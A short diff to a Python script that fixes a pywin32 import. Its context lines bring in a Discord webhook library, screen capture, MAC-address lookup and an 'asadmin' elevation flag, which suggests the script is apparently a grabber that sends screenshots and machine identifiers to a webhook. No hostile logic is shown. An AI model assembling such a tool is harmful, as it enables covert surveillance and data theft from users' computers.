@@ -9,7 +9,7 @@ from dhooks import Webhook, Embed, File
 from datetime import datetime
 from PIL import ImageGrab
 import sys
-import win32com.shell.shell as shell
+import win32comext.shell.shell as shell
 from getmac import get_mac_address as gma
 ASADMIN = 'asadmin'
 
